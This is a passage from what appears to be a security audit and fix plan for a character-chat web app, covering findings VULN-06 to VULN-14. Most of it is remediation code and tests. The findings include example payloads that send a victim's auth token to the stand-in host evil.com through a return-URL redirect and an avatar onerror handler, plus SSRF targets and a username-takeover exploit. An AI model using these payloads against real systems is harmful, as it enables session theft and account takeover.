      throw new ValidationError('Memory content cannot be empty', 'content');
    }

    // Deduplicate ONLY within the same session (or global canon scope when sessionId is null)
    const scopedExisting = await this.repository.findForContext(characterId, sessionId);
    const duplicate = scopedExisting.find(
      m => ((m.sessionId || null) === (sessionId || null)) && m.content.toLowerCase() === clean.toLowerCase()
    );
    if (duplicate) {
      return duplicate;
    }

    const memory = new CharacterMemory({
      characterId,
      sessionId,
      content: clean,
      source,
      importance
    });

    await this.repository.save(memory);

    memoryClient.addMemory(clean, characterId, {
      id: memory.id,
      source,
      importance,
      sessionId
    }).catch(() => {});

    return memory;
  }

  async getMemories(characterId, verifiedSessionId = null) {
    return await this.repository.findForContext(characterId, verifiedSessionId);
  }
```
- [ ] **Step 3**: Update `MemoryController.getMemories` and `MemoryController.deleteMemory` in `backend/controllers/memory.controller.js:22-108` to verify session ownership before passing `verifiedSessionId`:
```javascript
  async getMemories(req, res) {
    try {
      const { characterId, sessionId } = req.query;
      if (!characterId) {
        return this.fail(res, 400, 'characterId query parameter is required', 'characterId');
      }

      let verifiedSessionId = null;
      if (sessionId && req.user?.id) {
        const session = await this.sessionRepo.findById(sessionId, req.user.id);
        if (session && session.characterId === characterId) {
          verifiedSessionId = session.id;
        }
      }

      const [memories, storySummary] = await Promise.all([
        this.service.getMemories(characterId, verifiedSessionId),
        verifiedSessionId ? this.service.getStorySummary(characterId, verifiedSessionId) : Promise.resolve('')
      ]);

      const serviceHealthy = await this.service.isVectorServiceHealthy();

      return this.ok(res, {
        characterId,
        count: memories.length,
        vectorEngineActive: serviceHealthy,
        storySummary: storySummary || '',
        memories
      });
    } catch (error) {
      return this.handleError(res, error, 'MemoryController.getMemories');
    }
  }
```
  And in `deleteMemory(req, res)`:
  - If `targetMemory.sessionId` is non-null: allow deletion **only** if `await this.sessionRepo.findById(targetMemory.sessionId, req.user.id)` exists (or `req.user.role === 'admin'`). Do **not** let a non-admin character creator delete another user's private session memory.
  - If `targetMemory.sessionId` is `null` (global canon memory): require `character.canModify(req.user)`.

---

### [VULN-06] Client-Side XSS & Open Redirect (`?return=`, `renderUserAvatar`, `character.wiki`, & Missing CSP)
- **Severity**: **HIGH** (CVSS 8.1)
- **Location**:
  - `frontend/js/auth-page.js:153-163, 186-190`
  - `frontend/js/profile-setup-page.js:196-200`
  - `frontend/js/common.js:475-483`
  - `frontend/js/chat.js:1550`
  - `nextjs-frontend/components/layout/sidebar.tsx:277, 334`
  - `backend/controllers/character.controller.js:37-130`
  - `backend/middlewares/security.js:126-135`

#### What Was Found
1. **DOM XSS & Open Redirect via `?return=`**: While `nextjs-frontend/app/auth/page.tsx` has `sanitizeReturnUrl()`, the Vanilla JS pages `frontend/js/auth-page.js` (lines `156`, `160`, `188`) and `frontend/js/profile-setup-page.js` (line `199`) assign `window.location.href = returnUrl` directly from `new URLSearchParams(window.location.search).get('return')`.
   - Visiting `/auth.html?return=javascript:fetch('https://evil.com?t='+localStorage.cai_auth_token)` executes JavaScript immediately upon sign-in and steals the newly issued JWT!
   - Visiting `/auth.html?return=https://evil.com` redirects authenticated users to a phishing site.
2. **Stored XSS in `renderUserAvatar` (`frontend/js/common.js:475-483`)**:
   ```javascript
   function renderUserAvatar(el, avatarVal) {
     const val = (avatarVal || '👤').trim();
     if (/^(https?:\/\/|\/|data:)/i.test(val)) {
       el.innerHTML = `<img src="${val}" alt="" class="user-avatar-img" />`;
   ```
   `val` is injected into `innerHTML` **unescaped**! Setting a user's `avatar` via `PUT /api/auth/profile` to `https://x" onerror="fetch('https://evil.com?t='+localStorage.cai_auth_token)` executes XSS on `common.js` initialization across every page. Also `nextjs-frontend/components/layout/sidebar.tsx:277,334` allows arbitrary `data:` URLs (`data:image/svg+xml...`) instead of restricting to raster `data:image/(png|jpeg|jpg|webp|gif);base64,`.
3. **Stored `javascript:` Link XSS in `character.wiki` (`frontend/js/chat.js:1550`)**:
   ```javascript
   ${character.wiki ? `...<a href="${escapeHtml(character.wiki)}" target="_blank"...>` : ''}
   ```
   `escapeHtml` does not block `javascript:...` URLs, and `CharacterController` (`createCharacter` / `updateCharacter`) never validates `wiki` or `avatar` URL schemes. Clicking "Source Canon Wiki" on a malicious public character runs JavaScript in the victim's session.
4. **No Content-Security-Policy (`CSP`) Header**: `securityHeadersMiddleware()` in `backend/middlewares/security.js:126-135` sets `X-Frame-Options` and `X-Content-Type-Options`, but sets **no** `Content-Security-Policy`.

#### How to Fix
- [ ] **Step 1**: Create reproduction test `tests/vuln-06-xss-and-redirect.test.js` checking:
  1. `sanitizeReturnUrl` is defined and used in both `frontend/js/auth-page.js` and `frontend/js/profile-setup-page.js` and rejects `javascript:alert(1)`, `https://evil.com`, `//evil.com`, and `/\evil.com`.
  2. `renderUserAvatar` in `frontend/js/common.js` uses DOM `document.createElement('img')` (no `innerHTML` interpolation) and restricts `data:` URIs to `data:image/(png|jpeg|jpg|webp|gif);base64,`.
  3. `POST /api/character` with `wiki: "javascript:alert(1)"` or `avatar: "javascript:alert(1)"` is rejected with HTTP `400`.
- [ ] **Step 2**: Add `export function sanitizeReturnUrl(raw)` and safe `renderUserAvatar` in `frontend/js/common.js`:
```javascript
export function sanitizeReturnUrl(raw) {
  if (!raw || typeof raw !== 'string') return '/';
  const trimmed = raw.trim();
  if (!trimmed.startsWith('/') || trimmed.startsWith('//') || trimmed.startsWith('/\\')) {
    return '/';
  }
  return trimmed;
}

export function isSafeImageSrc(val) {
  if (!val || typeof val !== 'string') return false;
  return /^(https?:\/\/|\/(?!\/)|data:image\/(png|jpeg|jpg|webp|gif);base64,)/i.test(val.trim());
}

function renderUserAvatar(el, avatarVal) {
  if (!el) return;
  const val = String(avatarVal || '👤').trim();
  el.textContent = '';
  if (isSafeImageSrc(val)) {
    const img = document.createElement('img');
    img.src = val;
    img.alt = '';
    img.className = 'user-avatar-img';
    el.appendChild(img);
  } else {
    el.textContent = val.slice(0, 4) || '👤';
  }
}
```
  Import and apply `sanitizeReturnUrl(params.get('return'))` in `frontend/js/auth-page.js` (lines `156`, `160`, `186`) and `frontend/js/profile-setup-page.js` (line `197`).
- [ ] **Step 3**: Validate `character.wiki` in `frontend/js/chat.js:1550` (`/^https?:\/\//i.test(character.wiki)`) and add `rel="noopener noreferrer"` on the `<a>` tag. Also tighten `sidebar.tsx:277,334` to `/^(https?:\/\/|\/(?!\/)|data:image\/(png|jpeg|jpg|webp|gif);base64,)/i`.
- [ ] **Step 4**: Validate `wiki` and `avatar` fields in `backend/controllers/character.controller.js` (`createCharacter` and `updateCharacter`) and `auth.service.js` (`register` and `updateProfile`):
  - If `wiki` is non-empty, require `/^https?:\/\//i.test(wiki)` (throw `ValidationError` / `400` otherwise).
  - If `avatar` is non-empty and longer than 8 chars (not an emoji/monogram), require `/^(https?:\/\/|\/(?!\/)|data:image\/(png|jpeg|jpg|webp|gif);base64,)/i.test(avatar)`.
- [ ] **Step 5**: Add a baseline `Content-Security-Policy` in `backend/middlewares/security.js:126-135` (`object-src 'none'; base-uri 'self'; frame-ancestors 'none'; form-action 'self'`).

---

### [VULN-07] Character Ownership Hijacking via Mutable `@creator` Fallback & Missing Reserved Usernames
- **Severity**: **HIGH** (CVSS 8.1)
- **Location**:
  - `backend/models/Character.js:80-89`
  - `backend/services/auth.service.js:127-133, 218-232, 346-362`
  - `nextjs-frontend/components/profile/profile-editor.tsx:17-26`

#### What Was Found
1. **Reserved Username Mismatch (`@kazuken` Takeover)**:
   - All seeded canon characters in `backend/db/seed.sql` have `creator = '@kazuken'` and `owner_user_id = NULL`.
   - `AuthService.register()` (`auth.service.js:127`) blocks `['community', 'system', 'admin', 'administrator', 'moderator', 'root', 'support', 'kazuken', 'guest']`.
   - **However**, `AuthService.updateProfile()` (`auth.service.js:223`) **omits `'kazuken'` and `'guest'`**!
   - **Exploit**: Any user registers `@temp_user_1` and immediately calls `PUT /api/auth/profile` with `{"username": "kazuken"}`. Because `Character.canModify(user)` checks `this.creator.toLowerCase() === '@kazuken'`, that user immediately gains full edit, `/update`, memory-inject, and **DELETE** privileges over every seeded canon character in the universe!
2. **Mutable Handle Fallthrough Hijack**:
   - In `Character.canModify(user)` (`backend/models/Character.js:80-89`):
     ```javascript
     if (this.ownerUserId && this.ownerUserId === user.id) {
       return true;
     }
     if (user.username && this.creator) {
       const expectedCreator = `@${user.username.toLowerCase()}`;
       if (this.creator.toLowerCase() === expectedCreator && this.creator.toLowerCase() !== '@community') {
         return true;
       }
     }
     ```
   - Notice that when `this.ownerUserId` **is set** (e.g., `user_A`) and `this.ownerUserId !== user.id`, execution **still falls through** to the mutable `this.creator` string check! If User A (`@alice`) creates a character (`ownerUserId = user_A`, `creator = '@alice'`) and later renames her handle to `@alice_v2`, User B can claim `@alice` and edit or delete User A's characters!

#### How to Fix
- [ ] **Step 1**: Create reproduction test `tests/vuln-07-character-ownership-hijack.test.js` verifying:
  1. Renaming a standard user to `kazuken` or `guest` via `PUT /api/auth/profile` is rejected with HTTP `400`.
  2. When a character has `ownerUserId = userA.id` and `creator = '@old_handle'`, another user with `username = 'old_handle'` (`userB.id !== userA.id`) gets `character.canModify(userB) === false` (`403`).
- [ ] **Step 2**: Hoist a single frozen module-level `RESERVED_USERNAMES` Set at the top of `backend/services/auth.service.js` and enforce it uniformly across `register()`, `updateProfile()`, and `#generateUniqueSocialUsername()`:
```javascript
export const RESERVED_USERNAMES = Object.freeze(new Set([
  'community',
  'system',
  'admin',
  'administrator',
  'moderator',
  'root',
  'support',
  'kazuken',
  'guest',
  'you',
  'universe'
]));
```
  *(Also add `'kazuken'`, `'guest'`, `'you'` to `RESERVED_HANDLES` in `nextjs-frontend/components/profile/profile-editor.tsx:17-26` and `nextjs-frontend/components/auth/register-form.tsx:56`.)*
- [ ] **Step 3**: Fix `canModify(user)` in `backend/models/Character.js:80-89` so immutable `ownerUserId` is authoritative whenever present, and legacy `ownerUserId === null` system/canon creators cannot be claimed by regular users:
```javascript
  canModify(user) {
    if (!user || !user.id) return false;
    if (user.role === 'admin') return true;

    // When immutable ownerUserId exists, ONLY that owner ID has permission (never fall back to mutable @creator)
    if (this.ownerUserId) {
      return this.ownerUserId === user.id;
    }

    // Legacy / seeded rows without ownerUserId: block system/canon handles from non-admin takeover
    const PROTECTED_CREATORS = new Set(['@community', '@system', '@kazuken', '@you', '@admin']);
    if (user.username && this.creator) {
      const creatorLower = this.creator.toLowerCase();
      if (PROTECTED_CREATORS.has(creatorLower)) {
        return false;
      }
      return creatorLower === `@${user.username.toLowerCase()}`;
    }
    return false;
  }
```

---

### [VULN-08] SSRF Bypass via `translate.goog` Open Proxy, Unvalidated HTTP Redirects & Unbounded Fetch Body OOM
- **Severity**: **HIGH** (CVSS 7.8)
- **Location**:
  - `backend/config/index.js:37-43`
  - `backend/services/wiki.service.js:24-62, 116-153`

#### What Was Found
1. **Universal Open Proxy in Allowlist**: `config.ALLOWED_DOMAINS` (`backend/config/index.js:42`) includes `'translate.goog'`. Any domain on the internet can be proxied through `<arbitrary-domain-with-dashes>.translate.goog` (which satisfies `hostname.endsWith('.translate.goog')`), turning `WikiScraperService` into an open SSRF proxy to arbitrary external hosts.
2. **HTTP `301`/`302` Redirect SSRF Bypass**: `WikiScraperService.extractFromUrl()` validates the initial `url` with `this.validateUrl(url)`, then calls `fetch(mw.apiUrl)` and `fetch(url)` using Node's default `redirect: 'follow'`. If an allowed wiki subdomain returns `HTTP 302 Location: http://127.0.0.1:5001/memories` or `http://169.254.169.254/latest/meta-data/`, Node `fetch` silently follows the redirect into internal loopback/cloud-metadata services without re-running `validateUrl()`!
3. **Unbounded Response Memory Allocation**: `await directRes.text()` and `await apiRes.json()` buffer arbitrarily large upstream payloads into V8 memory before slicing to `12000` chars, enabling Out-Of-Memory (OOM) DoS via multi-hundred-megabyte wiki exports.

#### How to Fix
- [ ] **Step 1**: Create reproduction test `tests/vuln-08-wiki-ssrf-redirect.test.js` asserting:
  1. `validateUrl('https://evil-com.translate.goog/page')` throws `ValidationError`.
  2. `WikiScraperService` uses `redirect: 'manual'` (or re-validates every redirect `Location` URL against `validateUrl`) and caps response body bytes (`<= 2MB`).
- [ ] **Step 2**: Remove `'translate.goog'` from `ALLOWED_DOMAINS` in `backend/config/index.js:37-43`:
```javascript
  ALLOWED_DOMAINS: [
    'fandom.com',
    'wikipedia.org',
    'wikimedia.org',
    'wikiquote.org'
  ],
```
- [ ] **Step 3**: Add a safe `fetchSafeText(url, options, maxRedirects = 3, maxBytes = 2 * 1024 * 1024)` helper inside `WikiScraperService` (`backend/services/wiki.service.js`) that sets `redirect: 'manual'`, validates every `30x` `Location` target via `this.validateUrl(nextUrl)`, and aborts streams exceeding `2MB`:
```javascript
  async #fetchSafeText(initialUrl, headers = {}, timeoutMs = 12000, maxRedirects = 3, maxBytes = 2 * 1024 * 1024) {
    let currentUrl = this.validateUrl(initialUrl).toString();

    for (let hop = 0; hop <= maxRedirects; hop++) {
      const res = await fetch(currentUrl, {
        headers,
        redirect: 'manual',
        signal: AbortSignal.timeout(timeoutMs)
      });

      if ([301, 302, 303, 307, 308].includes(res.status)) {
        const location = res.headers.get('location');
        if (!location) {
          throw new ValidationError('Upstream wiki returned an invalid redirect', 'url');
        }
        const resolved = new URL(location, currentUrl).toString();
        currentUrl = this.validateUrl(resolved).toString();
        continue;
      }

      if (!res.ok) {
        const err = new Error(`Upstream HTTP ${res.status}`);
        err.httpStatus = res.status;
        throw err;
      }

      if (!res.body) return '';
      const reader = res.body.getReader();
      const decoder = new TextDecoder('utf-8');
      let totalBytes = 0;
      let text = '';

      while (true) {
        const { done, value } = await reader.read();
        if (done) break;
        totalBytes += value.byteLength;
        if (totalBytes > maxBytes) {
          await reader.cancel();
          break;
        }
        text += decoder.decode(value, { stream: true });
      }
      text += decoder.decode();
      return text;
    }

    throw new ValidationError('Too many redirects from wiki URL', 'url');
  }
```
  Then use `JSON.parse(await this.#fetchSafeText(mw.apiUrl, browserHeaders))` and `await this.#fetchSafeText(parsedUrl.toString(), browserHeaders)` inside `extractFromUrl()`.

---

### [VULN-09] Unauthenticated Persona Creation, AI Quota Drain & Global Character Like Race Condition
- **Severity**: **HIGH** (CVSS 7.5)
- **Location**:
  - `backend/controllers/persona.controller.js:35-52`
  - `backend/routes/persona.route.js:13`
  - `backend/routes/character.route.js:18-31`
  - `backend/controllers/character.controller.js:37-94, 152-222`
  - `backend/repositories/CharacterRepository.js`

#### What Was Found
1. **Unauthenticated Global Persona Tampering (`POST /api/personas`)**:
   - `persona.route.js:13` uses `optionalAuth`. While `updatePersona` and `deletePersona` enforce `if (!userId) return this.fail(res, 401, ...)`, `createPersona` (`persona.controller.js:35-52`) **forgot the `if (!userId)` check**!
   - An unauthenticated caller can `POST /api/personas` with `{"name": "...", "description": "[PROMPT INJECTION]", "isDefault": true}`, inserting a row with `user_id = NULL, is_default = 1` and clearing `is_default` on `persona_default` (`WHERE user_id IS NULL`) for all guests!
2. **Unauthenticated Gemini API Quota Drain (`/api/character/generate` & `/api/character/parse-wiki`)**:
   - Neither endpoint checks `req.user?.id`, allowing anonymous bots to invoke `geminiProvider.generateCharacterProfile()` in a loop and exhaust `GEMINI_API_KEY` billing/quota.
   - Furthermore, `generateCharacterAI` (`character.controller.js:206-214`) has **no maximum length check** on `concept` (accepting up to the 10MB JSON body limit and sending megabytes of prompt tokens to Gemini).
3. **Unauthenticated Character Creation & Global `is_liked` Full-Row Overwrite**:
   - `POST /api/character` (`optionalAuth`) lets unauthenticated callers insert permanent public characters with `owner_user_id = NULL, creator = '@you'`.
   - `POST /api/character/:id/like` is unauthenticated, toggles a single global `is_liked` column shared by all visitors, and calls `this.repository.save(character)` (a full-column `ON CONFLICT DO UPDATE` that overwrites concurrent character edits!).

#### How to Fix
> **Test Compatibility Note (`tests/api.test.js:228-262`)**:
> In `tests/api.test.js` Steps #4, #11, and #12:
> - Step #11 sends invalid URLs to `POST /api/character/parse-wiki` without an `Authorization` header and asserts HTTP `400`.
> - Step #12 sends oversized payloads (`name: 'A'.repeat(150)` to `POST /api/personas`, `tagline: 'B'.repeat(350)` to `POST /api/character`) without an `Authorization` header and asserts HTTP `400`.
> - Step #4 calls `POST /api/character/${createdChar.id}/like` without an `Authorization` header.
> **Therefore**: Always run synchronous input/URL validation (`400`) **before** checking `if (!req.user?.id) return this.fail(res, 401, ...)` in `createPersona`, `createCharacter`, `parseWiki`, and `generateCharacterAI`! That way invalid/SSRF payloads still return `400` immediately (keeping Steps #11 and #12 100% green), while valid unauthenticated mutation/LLM requests are blocked with `401` before touching SQL or Gemini!

- [ ] **Step 1**: Create reproduction test `tests/vuln-09-access-control-and-quota.test.js` asserting:
  1. Unauthenticated `POST /api/personas` with valid fields returns `401` (while `name.length > 100` still returns `400`).
  2. Unauthenticated `POST /api/character` with valid fields returns `401` (while `tagline.length > 300` still returns `400`).
  3. Unauthenticated `POST /api/character/generate` and valid-URL `POST /api/character/parse-wiki` return `401`, and `concept.length > 2000` returns `400`.
- [ ] **Step 2**: Update `PersonaController.createPersona` (`backend/controllers/persona.controller.js:35-52`):
```javascript
  async createPersona(req, res) {
    try {
      const { name, avatar, description, isDefault } = req.body || {};
      if (!name || !name.trim()) {
        return this.fail(res, 400, 'Persona name is required', 'name');
      }
      if (name.length > 100 || (description && description.length > 2000)) {
        return this.fail(res, 400, 'Persona name (max 100) or description (max 2000) exceeds length limit');
      }
      const userId = req.user?.id || null;
      if (!userId) {
        return this.fail(res, 401, 'Sign in required to create custom personas');
      }
      const created = await this.repository.create({ name, avatar, description, isDefault }, userId);
      return this.created(res, created);
    } catch (error) {
      return this.handleError(res, error, 'PersonaController.createPersona');
    }
  }
```
- [ ] **Step 3**: Update `createCharacter`, `parseWiki`, `generateCharacterAI`, and `toggleLike` in `backend/controllers/character.controller.js`:
  - In `createCharacter`: keep existing synchronous name/length validation (`400`) first, then enforce `if (!req.user?.id) return this.fail(res, 401, 'Authentication required to create a character');`.
  - In `parseWiki`: run `this.wikiService.validateUrl(url)` (`400` on invalid/SSRF URL) first, then enforce `if (!req.user?.id) return this.fail(res, 401, 'Authentication required to extract wiki lore');`.
  - In `generateCharacterAI`: check `!concept || concept.trim().length < 2` (`400`) and `if (concept.length > 2000) return this.fail(res, 400, 'Concept prompt must not exceed 2000 characters', 'concept');` first, then enforce `if (!req.user?.id) return this.fail(res, 401, 'Authentication required to synthesize AI characters');`.
  - In `CharacterRepository`: add atomic `toggleLikeAtomic(id)` (`UPDATE characters SET is_liked = CASE WHEN is_liked = 1 THEN 0 ELSE 1 END, likes = CASE WHEN is_liked = 1 THEN MAX(0, likes - 1) ELSE likes + 1 END WHERE id = ?`) so `toggleLike` never overwrites concurrent character profile edits via `.save(character)`.

---

### [VULN-10] JWT Session & Cookie Hardening (`decodeURIComponent` 500 Crash, Post-Reset Token Validity, Logout Cookie Clear, & Form-CSRF Surface)
- **Severity**: **MEDIUM** (CVSS 6.5)
- **Location**:
  - `backend/middlewares/auth.js:14-21`
  - `nextjs-frontend/lib/auth.ts:19-25, 43, 90-94`
  - `frontend/js/api.js:20, 428`
  - `backend/services/auth.service.js:56-109, 493-508`
  - `backend/controllers/auth.controller.js:129-131`
  - `server.js:86`

#### What Was Found
1. **Unhandled `URIError` HTTP 500 DoS**: `extractToken(req)` (`backend/middlewares/auth.js:18`) executes `decodeURIComponent(match[1])` outside any `try/catch`! Because `apiRateLimiter` and `optionalAuth` call `extractToken` on **every** `/api` and `/admin` request, sending `Cookie: cai_auth_token=%E0%A4%A` throws an uncaught `URIError: URI malformed` and returns HTTP `500` on every endpoint. The exact same unguarded `decodeURIComponent` exists in `nextjs-frontend/lib/auth.ts:93`.
2. **Stolen JWTs Survive Password Reset for 14 Days**: `verifyToken()` checks signature and `exp`, and `getUserFromToken()` loads `userRepo.findById(payload.sub)`, but nothing compares `payload.iat` or a password fingerprint against `user.passwordHash`. After a user resets a compromised password (`resetPassword`), pre-reset JWTs continue working for up to 14 days!
3. **Incomplete Cookie Security & Logout**:
   - `frontend/js/api.js:20,428` and `nextjs-frontend/lib/auth.ts:43` set `cai_auth_token` without `; Secure` on HTTPS (`window.location.protocol === 'https:'`).
   - `POST /api/auth/logout` (`auth.controller.js:129-131`) returns `{ success: true }` without sending a `Set-Cookie` header to expire `cai_auth_token`.
4. **Unnecessary Form-Encoded CSRF Surface**: `server.js:86` mounts `express.urlencoded({ extended: true, limit: '10mb' })` globally even though every API route uses JSON, while `extractToken` accepts `Cookie: cai_auth_token=...`. A cross-site HTML `<form method="POST" action="https://target/api/auth/logout">` (or any cookie-authenticated `POST` endpoint under `SameSite=Lax` top-level navigation / sibling subdomain) is parsed by `express.urlencoded`.

#### How to Fix
- [ ] **Step 1**: Create reproduction test `tests/vuln-10-jwt-and-cookie-hardening.test.js` asserting:
  1. `GET /api/characters` with header `Cookie: cai_auth_token=%E0%A4%A` returns `200` (not `500`).
  2. A JWT issued **before** `resetPassword()` is rejected (`401`) immediately after the user resets their password!
  3. `POST /api/auth/logout` sends `Set-Cookie: cai_auth_token=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax`.
- [ ] **Step 2**: Wrap `decodeURIComponent` in `try/catch` in `backend/middlewares/auth.js:14-21` and `nextjs-frontend/lib/auth.ts:90-94`:
```javascript
// backend/middlewares/auth.js
export function extractToken(req) {
  const authHeader = req.headers.authorization || '';
  if (authHeader.startsWith('Bearer ')) {
    return authHeader.slice(7).trim();
  }
  if (req.headers['x-auth-token']) {
    return String(req.headers['x-auth-token']).trim();
  }
  const rawCookie = req.headers.cookie || '';
  const match = rawCookie.match(/(?:^|;\s*)cai_auth_token=([^;]+)/);
  if (match) {
    try {
      return decodeURIComponent(match[1]);
    } catch {
      return null;
    }
  }
  return null;
}
```
- [ ] **Step 3**: Bind JWTs cryptographically to the user's current `passwordHash` without needing a schema migration!
  In `backend/services/auth.service.js`:
  - Add helper `#passwordFingerprint(passwordHash)`:
    ```javascript
    #passwordFingerprint(passwordHash = '') {
      return crypto
        .createHmac('sha256', config.AUTH_TOKEN_SECRET)
        .update(String(passwordHash || ''))
        .digest('hex')
        .slice(0, 16);
    }
    ```
  - Include `pwd: this.#passwordFingerprint(user.passwordHash)` in `issueToken(user)` payload (`auth.service.js:56-68`).
  - In `getUserFromToken(token)` (`auth.service.js:103-109`), verify:
    ```javascript
    const user = await this.userRepo.findById(payload.sub);
    if (!user) return null;
    if (payload.pwd && payload.pwd !== this.#passwordFingerprint(user.passwordHash)) {
      return null;
    }
    return user;
    ```
    Now changing a password via `resetPassword()` immediately invalidates every previously issued JWT for that account!
- [ ] **Step 4**: Clear cookie server-side in `AuthController.logout` (`backend/controllers/auth.controller.js:129-131`):
```javascript
  async logout(req, res) {
    const secureFlag = config.IS_PRODUCTION ? '; Secure' : '';
    res.setHeader('Set-Cookie', `cai_auth_token=; Path=/; Max-Age=0; HttpOnly; SameSite=Lax${secureFlag}`);
    return this.ok(res, { success: true });
  }
```
  And append `${window.location.protocol === 'https:' ? '; Secure' : ''}` when setting `document.cookie` in `frontend/js/api.js:20,428` and `nextjs-frontend/lib/auth.ts:43`.
- [ ] **Step 5**: Remove `this.app.use(express.urlencoded({ extended: true, limit: '10mb' }));` from `server.js:86` (or reduce `express.json({ limit: '7mb' })` and require `application/json` on `/api` POST/PUT/DELETE mutations with body).

---

### [VULN-11] Rate Limiter `X-Forwarded-For` Spoofing Bypass & Unbounded `Map` Memory Exhaustion
- **Severity**: **MEDIUM** (CVSS 6.5)
- **Location**:
  - `server.js:54-56`
  - `backend/middlewares/security.js:1-3, 18-86`

#### What Was Found
1. **IP Spoofing Rate-Limit Bypass**:
   - `server.js:54-56` calls `this.app.set('trust proxy', true)` when `TRUST_PROXY=true`. In Express, boolean `true` trusts **all** hops in `X-Forwarded-For` and picks the client-controlled leftmost entry!
   - Even when `trust proxy` is `false`, `extractClientIp(req)` (`security.js:1-3`) falls back to `req.headers['x-forwarded-for']?.split(',')[0]?.trim()`. An attacker sending randomized `X-Forwarded-For: 1.2.3.4` headers bypasses `authRateLimiter` (brute-forcing passwords and OTPs infinitely) whenever `req.ip` is empty or `TRUST_PROXY=true`!
2. **Heap Exhaustion DoS**: `RateLimiter.hits = new Map()` (`security.js:23`) only runs `cleanup()` once every 5 minutes and has **no `maxEntries` ceiling**. Flooding `/api/health` with millions of spoofed keys grows `this.hits` without bound until Node crashes with V8 Out-Of-Memory.

#### How to Fix
- [ ] **Step 1**: Create reproduction test `tests/vuln-11-ratelimiter-hardening.test.js` asserting that `extractClientIp` ignores raw `X-Forwarded-For` when `req.ip` is present/untrusted, and `RateLimiter` evicts oldest entries when `maxEntries` (e.g., `10000`) is exceeded.
- [ ] **Step 2**: In `server.js:54-56`, use hop count `1` (single reverse proxy hop such as Render/Cloudflare/Railway) instead of boolean `true`:
```javascript
    if (process.env.TRUST_PROXY === 'true' || process.env.TRUST_PROXY === '1') {
      this.app.set('trust proxy', 1);
    }
```
- [ ] **Step 3**: In `backend/middlewares/security.js`, remove the raw `req.headers['x-forwarded-for']` fallback from `extractClientIp(req)` and add a `maxEntries = 10000` FIFO eviction cap in `RateLimiter`:
```javascript
function extractClientIp(req) {
  return req.ip || req.socket?.remoteAddress || 'unknown';
}
```
  And inside `RateLimiter.middleware()` before `this.hits.set(key, bucket)`:
```javascript
      if (!bucket) {
        if (this.hits.size >= (this.maxEntries || 10000)) {
          const oldestKey = this.hits.keys().next().value;
          if (oldestKey !== undefined) this.hits.delete(oldestKey);
        }
        bucket = { count: 0, resetAt: now + this.windowMs };
        this.hits.set(key, bucket);
      }
```

---

### [VULN-12] Predictable Entity IDs & Cross-User `UserPersona` Collision Overwrite
- **Severity**: **MEDIUM** (CVSS 6.4)
- **Location**:
  - `backend/models/UserPersona.js:11`
  - `backend/repositories/PersonaRepository.js:85-100`
  - `backend/models/User.js:13`
  - `backend/models/ChatSession.js:24, 69, 75`
  - `backend/models/CharacterMemory.js:11`

#### What Was Found
1. **Cross-User Persona Collision & Ownership Reassignment**:
   - `UserPersona.js:11` generates IDs as ``persona_${Date.now()}`` with **zero random bytes**!
   - `PersonaRepository.js:91-99` runs:
     ```sql
     INSERT INTO user_personas (id, user_id, name, avatar, description, is_default)
     VALUES (?, ?, ?, ?, ?, ?)
     ON CONFLICT(id) DO UPDATE SET
       user_id = excluded.user_id, ...
     ```
   - Two users registering or creating a persona within the same millisecond get the **exact same `id`**, causing the second user's INSERT to overwrite the first user's persona and steal its `user_id`!
2. **Non-CSPRNG `Math.random()` IDs**: While `BaseEntity.generateId()` was upgraded to `crypto.randomBytes(8)` in `sec-01`, `User.js:13`, `ChatSession.js:24,69,75`, and `CharacterMemory.js:11` still override `id` using `Math.random().toString(36)`.

#### How to Fix
- [ ] **Step 1**: Create reproduction test `tests/vuln-12-csprng-model-ids.test.js` creating 500 `UserPersona`, `User`, `ChatSession`, and `CharacterMemory` instances in a tight loop and asserting `100%` unique IDs with zero `Math.random()` usage in `backend/models/`.
- [ ] **Step 2**: Replace `Date.now()` / `Math.random()` with `crypto.randomBytes(8).toString('hex')` across all 4 model files:
  - `backend/models/UserPersona.js`: `id: data.id || \`persona_${Date.now()}_${crypto.randomBytes(8).toString('hex')}\``
  - `backend/models/User.js`: `id: data.id || \`user_${Date.now()}_${crypto.randomBytes(8).toString('hex')}\``
  - `backend/models/CharacterMemory.js`: `id: data.id || \`mem_${Date.now()}_${crypto.randomBytes(8).toString('hex')}\``
  - `backend/models/ChatSession.js`: use `crypto.randomBytes(6).toString('hex')` for `session_`, `msg_`, and `var_` IDs.
- [ ] **Step 3**: Remove `user_id = excluded.user_id` from `ON CONFLICT(id) DO UPDATE` in `backend/repositories/PersonaRepository.js:94` (and add `WHERE user_personas.user_id IS excluded.user_id` so a conflict can never transfer ownership across users).

---

### [VULN-13] Vulnerable NPM Dependencies (`next@14.2.24` Critical CVE-2025-29927, `undici`, `body-parser`, `nodemailer`)
- **Severity**: **MEDIUM / HIGH** (`npm audit` reports **1 Critical, 6 High, 4 Moderate** across workspace)
- **Location**:
  - `package.json` & `package-lock.json`
  - `nextjs-frontend/package.json` & `nextjs-frontend/package-lock.json`

#### What Was Found
Running `npm audit` against both `package.json` manifests revealed:
1. **Root Backend (`package.json`)**:
   - `body-parser` (**High** — DoS / URL encoding vulnerability, fix available via `npm audit fix`)
   - `undici` (**High** — HTTP client header/redirect/DoS advisories, fix available via `npm audit fix`)
   - `nodemailer` (**Moderate** — address parser vulnerability, fix available via `npm audit fix`)
2. **Next.js Frontend (`nextjs-frontend/package.json`)**:
   - `next@14.2.24` (**CRITICAL** — affected by **CVE-2025-29927** Next.js middleware `x-middleware-subrequest` authorization bypass + SSRF/cache poisoning advisories; patched in `next@14.2.25+` / `14.2.35+` or `15.x`).
   - `postcss` / `eslint-config-next` (**High** / **Moderate**).

#### How to Fix
- [ ] **Step 1**: Run `npm audit fix` in the repository root (`c:\Users\giuag\OneDrive\Documents\My C.AI Universe`) to patch `body-parser`, `undici`, and `nodemailer` non-breakingly, then run `npm test`.
- [ ] **Step 2**: In `nextjs-frontend/package.json`, upgrade `next` and `eslint-config-next` to the latest patched `14.2.x` security release (e.g., `"next": "^14.2.35"`, `"eslint-config-next": "^14.2.35"` — keeping React 18 & App Router 100% compatible without breaking Tailwind v3), run `npm install` inside `nextjs-frontend`, and run `npm test` inside `nextjs-frontend` (`node --experimental-strip-types --test tests/unit/core.test.mjs`).

---

### [VULN-14] Express 5 Crash on String `error.code` & Verbose Infrastructure Telemetry Leak (`/api/health`)
- **Severity**: **LOW** (CVSS 5.3)
- **Location**:
  - `server.js:94-106, 238-246`
  - `backend/controllers/BaseController.js:52-58`

#### What Was Found
1. **Express 5 Invalid Status Code Crash**:
